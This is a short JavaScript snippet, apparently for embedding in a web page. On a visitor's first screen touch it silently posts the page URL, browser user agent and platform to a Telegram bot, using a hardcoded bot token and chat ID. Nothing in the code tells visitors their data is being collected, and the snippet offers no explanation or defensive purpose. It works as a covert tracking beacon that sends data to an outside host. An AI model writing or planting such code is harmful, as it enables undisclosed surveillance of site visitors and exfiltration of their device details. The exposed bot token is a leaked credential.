 let currentLocation = window.location;
console.log(currentLocation);

let botToken = '6163011453:AAE2E6uKEE1hyQ3knu7tjJpYwIDvS7yEQPg';
let chatId = '5303172024';
let messageText = currentLocation.href;

let apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

function handleTouchStart(e) {
  let deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
  };

  fetch(apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: `${messageText}\nDevice Info: ${JSON.stringify(deviceInfo)}`,
    }),
  });

  document.removeEventListener('touchstart', handleTouchStart);
}

document.addEventListener('touchstart', handleTouchStart);
